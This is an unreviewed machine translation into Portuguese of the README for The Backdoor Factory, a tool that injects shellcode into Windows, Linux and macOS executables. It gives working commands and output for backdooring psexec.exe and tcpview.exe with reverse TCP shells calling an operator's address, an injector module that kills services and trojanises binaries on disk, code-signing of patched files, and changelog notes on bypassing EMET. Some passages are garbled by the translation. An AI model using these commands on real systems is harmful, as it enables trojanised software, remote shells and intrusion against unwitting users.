---
title: "backdoor-factory — documentação oficial"
type: "official-documentation"
tool: "backdoor-factory"
status: "translated-machine"
reviewed: "2026-10-26"
language: "pt-BR"
tags: ["documentation", "tool/backdoor-factory"]
cssclasses: ["fieldbook"]
source_url: "https://github.com/secretsquirrel/the-backdoor-factory/blob/0c53045cd67261437b09b3252b37e7861bd285db/README.md"
source_commit: "0c53045cd67261437b09b3252b37e7861bd285db"
source_sha256: "2e867cd1d2747f15e89272e5c23a8366b91745fc2122d1105633c4304fec2851"
license_spdx: "BSD-3-Clause"
human_review: "pending"
source_scope: "Repository root README and owned doc/docs/documentation Markdown or RST files; not a claim of full wiki/site coverage"
---

> Tradução automática local para português, ainda sem revisão humana integral. Estrutura e blocos de código preservados; referências externas não significam conteúdo espelhado.


# The new version of BACKDOOR FACTORY is available! Get access here: https://github.com/sponsors/secretsquirrel

# WARNING: Pull Requests WILL BE IGNORED AND CLOSED.

<a id="the-backdoor-factory-bdf"></a>
## Fábrica Backdoor (BDF)

Apenas para profissionais de segurança e pesquisadores.

O objetivo do BDF é patchar binários executáveis com o shellcode desejado pelo usuário e continuar a execução normal do estado prepatched.

[Join the chat at https://gitter.im/secretsquirrel/the-backdoor-factory](https://gitter.im/secretsquirrel/the-backdoor-factory?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)  [Black Hat Arsenal](https://www.blackhat.com/us-15/arsenal.html)

Chapéu preto EUA 2015:

    Video: https://www.youtube.com/watch?v=OuyLzkG16Uk
    
    Paper: https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf


Shmoocon 2015:
    
    Video: https://archive.org/details/joshpitts_shmoocon2015

    Paper: https://www.dropbox.com/s/te7e35c8xcnyfzb/JoshPitts-UserlandPersistenceOnMacOSX.pdf


DerbyCon 2014:

    Video: http://www.youtube.com/watch?v=LjUN9MACaTs


DerbyCon 2013:
    
    Video: http://www.youtube.com/watch?v=jXLb2RNX5xs

    Injection Module Demo: http://www.youtube.com/watch?v=04aJAex2o3U

    Slides: http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory


Contacte o desenvolvedor em:
  
    IRC:
    irc.freenode.net #BDFactory 

    Twitter:
    @midnite_runr


Sob uma licença de cláusula BSD 3

Veja o wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki

---
<a id="installing"></a>
## Instalar

### DOCKER
```text
docker pull secretsquirrel/the-backdoor-factory
docker run -it secretsquirrel/the-backdoor-factory bash
# ./backdoor.py
```

<a id="old-school"></a>
### ESCOLA ÚLTIMA

<a id="dependences"></a>
#### Dependência
####*Para usar OnionDuke você DEVE estar em uma máquina de inteligência porque aPLib ainda não tem suporte para o chipset ARM.*


[Motor Capstone](http://www.capstone-engine.org) pode ser instalado a partir do PyPi com:

    sudo pip install capstone

Pefile, mais recente:
    
    https://code.google.com/p/pefile/

Osslsigncode (incluído no repo):
    
    http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/

Instalação do Kali:

      apt-get update
      apt-get install backdoor-factory


Outros *NIX/MAC INSTALL:

    ./install.sh

Isto irá instalar Capstone com 3.01 pip para instalar pefile.

ATUALIZAÇÃO:

    ./update.sh


---

Apoio:

    Windows PE x86/x64,ELF x86/x64 (System V, FreeBSD, ARM Little Endian x32), 
    and Mach-O x86/x64 and those formats in FAT files
    
    Packed Files: PE UPX x86/x64
    
    Experimental: OpenBSD x32 


Alguns executáveis construíram proteções, como tal, isso não funcionará em todos os binários. É aconselhável que você teste os binários antes de implantá- los para os clientes ou usá- los em exercícios. Estou prestes a ignorar o NSIS, então ignorar essas verificações será incluído no futuro.

    Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
    Without him, I would still be trying to do stupid things 
    with the elf format.
    Also thanks to Silvio Cesare with his 1998 paper 
    (http://vxheaven.org/lib/vsc01.html) which these ELF patching
    techniques are based on.



Recentemente testado em muitos binários.
---

./porta dos fundos.py -h
    Usage: backdoor.py [options]

    
---

<a id="features"></a>
## Características:

<a id="pe-files"></a>
### arquivos PE

    Can find all codecaves in an EXE/DLL.
    By default, clears the pointer to the PE certificate table, thereby unsigning a binary.
    Can inject shellcode into code caves or into a new section.
    Can find if a PE binary needs to run with elevated privileges.
    When selecting code caves, you can use the following commands:
      -Jump (j), for code cave jumping
      -Single (s), for patching all your shellcode into one cave
      -Append (a), for creating a code cave
      -Ignore (i or q), nevermind, ignore this binary
    Can ignore DLLs
    Import Table Patching
    AutoPatching (-m automtic)
    Onionduke (-m onionduke)

<a id="elf-files"></a>
### arquivos ELF

    Extends 1000 bytes (in bytes) to the TEXT SEGMENT and injects shellcode into that section of code.

<a id="mach-o-files"></a>
### arquivos Mach-O
    Pre-Text Section patching and signature removal

<a id="overall"></a>
### Globalmente
    
    The user can :
      -Provide custom shellcode.
      -Patch a directory of executables/dlls.
      -Select x32 or x64 binaries to patch only.
      -Include BDF is other python projects see pebin.py and elfbin.py

---------------------------------------------

Utilização da Amostra:
---

<a id="patch-an-exedll-using-an-existing-code-cave"></a>
### Patch um exe/dll usando uma caverna de código existente:

    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 

    [*] In the backdoor module
    [*] Checking if binary is supported
    [*] Gathering file info
    [*] Reading win32 entry instructions
    [*] Looking for and setting selected shellcode
    [*] Creating win32 resume execution stub
    [*] Looking for caves that will fit the minimum shellcode length of 402
    [*] All caves lengths:  (402,)
    ############################################################
    The following caves can be used to inject code and possibly
    continue execution.
    **Don't like what you see? Use jump, single, append, or ignore.**
    ############################################################
    [*] Cave 1 length as int: 402
    [*] Available caves:
    1. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e4d5 End: 0x2e6d0; Cave Size: 507
    2. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e6e9 End: 0x2e8d5; Cave Size: 492
    3. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e8e3 End: 0x2ead8; Cave Size: 501
    4. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2eaf1 End: 0x2ecdd; Cave Size: 492
    5. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2ece7 End: 0x2eee0; Cave Size: 505
    6. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2eef3 End: 0x2f0e5; Cave Size: 498
    7. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f0fb End: 0x2f2ea; Cave Size: 495
    8. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f2ff End: 0x2f4f8; Cave Size: 505
    9. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f571 End: 0x2f7a0; Cave Size: 559
    10. Section Name: .rsrc; Section Begin: 0x30600 End: 0x5f200; Cave begin: 0x5b239 End: 0x5b468; Cave Size: 559
    **************************************************
    [!] Enter your selection: 5
    Using selection: 5
    [*] Changing Section Flags
    [*] Patching initial entry instructions
    [*] Creating win32 resume execution stub
    [*] Overwriting certificate table pointer
    [*] psexec.exe backdooring complete
    File psexec.exe is in the 'backdoored' directory

---

<a id="patch-an-exedll-by-adding-a-code-section"></a>
### Patch an exe/dll adicionando uma seção de código:

    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a 
    [*] In the backdoor module
    [*] Checking if binary is supported
    [*] Gathering file info
    [*] Reading win32 entry instructions
    [*] Looking for and setting selected shellcode
    [*] Creating win32 resume execution stub
    [*] Creating Code Cave
    - Adding a new section to the exe/dll for shellcode injection
    [*] Patching initial entry instructions
    [*] Creating win32 resume execution stub
    [*] Overwriting certificate table pointer
    [*] psexec.exe backdooring complete
    File psexec.exe is in the 'backdoored' directory

---

<a id="patch-a-directory-of-exes"></a>
### Correcção de uma pasta de exes:
    ./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a
    ...output too long for README...

---

<a id="user-supplied-shellcode"></a>
### Código de shell fornecido pelo usuário:
    msfpayload windows/exec CMD='calc.exe' R > calc.bin
    ./backdoor.py -f psexec.exe -s user_supplied_shellcode -U calc.bin
    This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.

---
<a id="pecodesigning"></a>
### Assinatura do PEcodeSigning

BDF pode assinar arquivos PE se você tiver um certificado de assinatura de código. Ele usa osslsigncode.
Coloque o seu certificado de assinatura e a chave privada na pasta certs/. Prepare os seus certificados usando comandos openssl a partir desta publicação do blog:
http://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html

Coloque sua senha de chave privada em um arquivo (gasp) como tal (exatamente assim):
    
    echo -n yourpassword > certs/passFile.txt

Nomeie os seus certificados exatamente como segue:
	
    signingCert.cer => certs/signingCert.cer
    signingPrivateKey.pem => certs/signingPrivateKey.pem

O seu certificado/ directório deverá parecer excatly como tal:
    
    certs
    ├── passFile.txt
    ├── signingPrivateKey.pem
    └── signingCert.cer

Activar a Assinatura do Código PE com a opção -C como tal:

     ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C


Na execução bem sucedida você deve ver esta linha na saída do BDF:

    [*] Code Signing Succeeded



---
<a id="hunt-and-backdoor-injector--windows-only"></a>
### Caçar e backdoor: Injector Só Windows
    The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
    Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.

    ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow 

---

### Changelog

####01/11/2016

* Corrigir erro de truncamento ponto de entrada que levou à recuperação inadequada em casos raros


####07/04/2016

* Suporte para caminhos dinâmicos em BDFProxy para pré-processador

####06/19/2016

* Adicionado o pré-processador e outras otimizações
* O pré-processador permite ao usuário modificar o binário antes da injeção de carga útil
* Invocar com a bandeira -p
* Ver amostras em ./pré-processador/


####12/20/2015

 * Foram adicionados os caminhos das pastas para o BDF para encontrar o directório dos certificados.


####12/18/2015
 * Adicionado suporte de codificação PE. Você deve fornecer seu próprio certificado de assinatura de código. Veja aqui: https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning

####11/17/2015

 * Correção de Bug na seção rsrc para patching onionduke e remover o valor da versão win32 aleatório no Cabeçalho PE

####11/13/2015
  * Adicionado truncamento adequado de um arquivo PE após o ponteiro de assinatura ser limpo no cabeçalho PE - por exemplo, não assinando corretamente. Resultando em melhor suporte para o patch IAT

####10/19/2015
  * Erro corrigido na atribuição de cavernas de diretórios IAT que causou falha do BDF
  * Tornou o recurso opcional com -A flag

####10/13/2015
   * Alterou as modificações de Importação de Diretório de Tabelas da adição de uma nova seção para usar uma caverna de código existente


####08/12/2015
   * Adicionado 'substituir' PATCH_METHOD - uma pasta de cópia em linha reta PE do binário fornecido
   * Mais para uso com BDFProxy

        Usage: ./backdoor.py -f weee.exe -m replace -b supplied_binary.exe

####08/11/2015
   * Fixação de estabilidade para seleção de cavernas automáticas para cavernas raras de sobreposição

####08/05/2015
    
   * BH EUA updates, w00t!
   * CebolaDuke, use -m ceboladuke
    * Supports user supplied exe's and dll's
    * Usage: ./backdoor.py -f originalfile.exe -m onionduke -b pentest.dll/exe 
   * XP MODE = Carregamentos baseados em IAT anteriores não suportam XP, Wine ou Windows 98. Se você precisar de suporte XP use a bandeira -X. Eu não estou suportando nada menos do que XP (e não XP x64).
   * Invoke UAC prompt to runas as admin. *perimental* - patches o manifesto PE se solicitadoExecutionLevel existe.
   * Actualizações de estabilidade:
  	* Corrigido um erro com cálculo RVA incorreto jmp'ing em 2+ cavernas de código
  	* Melhores verificações para determinar se uma nova seção para o IAT irá escrever em dados anexados e, portanto, falhar
   * Melhorias de Velocidade:
    * Faster code cave finding while using *automatic* mode (-m automatic)
    * Faster rsrc parsing to find manifest file 

####5/01/2015

   * Correção de Bug para a carga útil reversa_tcp_stager_threaded ao usar a carga útil de cavernas simples

####4/28/2015

   * Adicionando verificação para as Importações Fixo (os arquivos PE com as importações vinculadas não serão corrigidos)

####4/14/2015

Tantas actualizações:
  * Remendo automático para arquivos PE (use -m automático com uma carga útil *_threaded)
  
  * Novas cargas IAT para arquivos x86/x64 PE

  * Apenas observe: https://www.youtube.com/watch?v=kkLI_ur6BxY

####2/14/2015
Eu <3 vocês

* Adicionado patching de tabela de endereço de importação para PEs para suportar cargas úteis iat_reverse_tcp que
usar a tabela de importação para chamadas winAPI. Se o binário que você está patching não
ter LoadLibraryA e GetProcAddress, por exemplo, o BDF irá patchá-lo para um
nova tabela de importação em uma nova seção. Suporta x64/x86 PEs.

* Adicionado iat_reverse_tcp para x64 PEs.

* Correcções de erros e melhorias

####1/1/2015

Feliz Ano Novo!

Duas novas cargas úteis do OS X! O atraso: late_reverse_shell_tcp

-B 30 --> Atrasar a carga por 30 segundos, o código principal é executado imediatamente.

Configuração do compromisso de capstone firme para construção em BDF, capstone 'Next' repo
quebra o BDF.

Fixações para apoiar a implementação da capstone cython problema de truncamento nulo byte


####12/27/2014

Adicionados os testes de carga útil.py

Este script irá produzir arquivos em 'backdoor' que permitirão ao usuário
testar as cargas úteis como desejarem. Cada tipo de carga incrementa a porta usada
Por um.


    Usage: payloadtest.py binary HOST PORT
  

####12/17/2014

OS X Beaconing Payloads para x86 e x64: beaconing_reverse_shell_tcp

-B 15 --> definir a hora do farol para 15 segundos

Correcção de erros para suportar o OS X para o BDFProxy



####10/11/2014

Adicionado o patch do PE UPX



####9/26/2014

Mach-O x86/x64 adicionado

Otimização da carga útil do IAT x86



####7/31/2014 

Adicionado suporte para ARM x32 LE ELF patching



####7/22/2014 

Adicionado suporte ao patching do FreeBSD x32 ELF

Mudar para a Licença de Cláusula BSD 3



####7/13/2014 

Capstone incorporado: http://www.capstone-engine.org/

Durante o processo de adicionar Capstone, removi cerca de 500 linhas de código.

Renomeado loadliba_reverse_tcp para iat_reverse_tcp.

Pequenas otimizações para a velocidade.



####5/30/2014 

Adicionado um novo código de shell win86: loadliba_reverse_tcp
    
  - Baseado na seguinte pesquisa de Jared DeMott: http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf -- Obrigado @bannedit0 por mencionar isso.
  - Este shellcode usa as APIs LoadLibraryA e GetProcAddress para encontrar todas as APIs necessárias para uma conexão TCP reversa. Não mais do Stephen Lowers API hash lookup (que ainda é brilhante).
  - Não é furtivo, é dependente da posição, mas os resultados são ótimos (code cave jumping): https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/
  - Passa pelo EMET 4.1. A protecção do chamador não o apanha.
  - Como tal, eu vou promover esta ideia com um algo que patches o binário com código de shell personalizado com base nas APIs que estão no IAT. Incluindo portar os códigos de shell win86 atuais para esta ideia.

---


---

## Procedência desta tradução

Fonte: [https://github.com/secretsquirrel/the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory/blob/0c53045cd67261437b09b3252b37e7861bd285db/README.md). Licença: [BSD-3-Clause](../../99-Assets/upstream/backdoor-factory/LICENSE.txt). Commit: 0c53045cd67261437b09b3252b37e7861bd285db.

O original preservado, a lista de mudanças de apresentação e os hashes constam no manifesto do projeto. Nenhum exemplo desta documentação foi executado automaticamente.
